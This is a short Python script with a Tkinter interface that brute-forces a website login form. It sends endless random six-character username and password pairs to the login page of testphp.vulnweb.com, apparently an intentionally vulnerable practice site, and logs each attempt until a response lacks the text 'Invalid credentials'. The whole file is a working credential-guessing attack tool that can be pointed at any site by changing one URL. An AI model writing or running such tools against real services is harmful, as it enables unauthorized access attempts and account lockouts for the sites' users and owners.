import tkinter as tk
from tkinter import scrolledtext
import threading
import requests
import random
import string
import time

def generate_random_string(length=6):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def start_brute_force():
    def brute_force():
        attempt = 1
        url = "http://testphp.vulnweb.com/login.php"
        while True:
            username = generate_random_string()
            password = generate_random_string()

            data = {
                'uname': username,
                'pass': password,
                'login': 'login'
            }

            try:
                response = requests.post(url, data=data)
                log_box.insert(tk.END, f"[{attempt}] Trying -> {username}:{password}\n")
                log_box.yview(tk.END)

                if "Invalid credentials" not in response.text:
                    log_box.insert(tk.END, f"\n[+] SUCCESS with {username}:{password}\n")
                    break
            except Exception as e:
                log_box.insert(tk.END, f"[!] Error: {e}\n")
                break

            attempt += 1
            time.sleep(1)

    thread = threading.Thread(target=brute_force)
    thread.start()

# Tkinter UI setup
root = tk.Tk()
root.title("Brute Force Login - Ethical Test")
root.geometry("500x400")

start_btn = tk.Button(root, text="Start Brute Force", command=start_brute_force, bg="red", fg="white", font=("Arial", 12))
start_btn.pack(pady=10)

log_box = scrolledtext.ScrolledText(root, width=60, height=20, font=("Consolas", 10))
log_box.pack(padx=10, pady=10)

root.mainloop()